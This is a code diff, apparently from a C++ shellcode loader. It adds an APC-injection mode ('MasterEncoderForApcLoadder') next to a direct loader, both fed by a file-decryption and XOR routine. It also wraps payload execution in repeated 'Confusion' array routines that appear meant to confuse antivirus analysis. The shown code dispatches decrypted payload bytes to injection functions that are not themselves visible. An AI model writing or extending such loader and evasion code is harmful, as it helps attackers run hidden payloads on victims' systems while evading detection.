@@ -8,6 +8,8 @@
 #include <thread>
 #include "Launch.h"
 
+
+
 void Launch::au9u5tDecrypt() {
     std::ifstream inputFile{this->filePath, std::ios::binary};
     if (!inputFile) {
@@ -108,14 +110,33 @@ void Launch::funcFile_XOR(string &encryptedData) {
 
 void Launch::launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength) {
     if (function_mode == "1") {
-        MasterEncoder::generateAndSortArray();
         Confusion::generateAndSortArray();
-        std::cout << "in Function 1" << std::endl;
-        MasterEncoder::function1(decryptedData, byteLength);
+        this->printMode("Function 1");
+        this->startBase(MasterEncoderForDirectlyLoader::function1, decryptedData, byteLength);
         Confusion::generateAndSortArray();
-        MasterEncoder::generateAndSortArray();
+
+    } else if (function_mode == "2") {
+        Confusion::generateAndSortArray();
+        this->printMode("Function 2");
+        this->startBase(MasterEncoderForApcLoadder::function1, decryptedData, byteLength);
+        Confusion::generateAndSortArray();
     } else {
         std::cout << "Invalid function mode!" << std::endl;
         return;
     }
+}
+
+void Launch::printMode(const string &mode) {
+    std::cout << "in function: " << mode << std::endl;
+}
+
+void Launch::startBase(startFunction startFunction, const unsigned char *decryptedData, size_t &byteLength) {
+    MasterEncoderForApcLoadder::generateAndSortArray();
+    Confusion::generateAndSortArray();
+    Confusion::generateAndTransformArray();
+    startFunction(decryptedData, byteLength);
+    Confusion::generateAndSortArray();
+    Confusion::generateAndTransformArray();
+    MasterEncoderForApcLoadder::generateAndSortArray();
+
 }
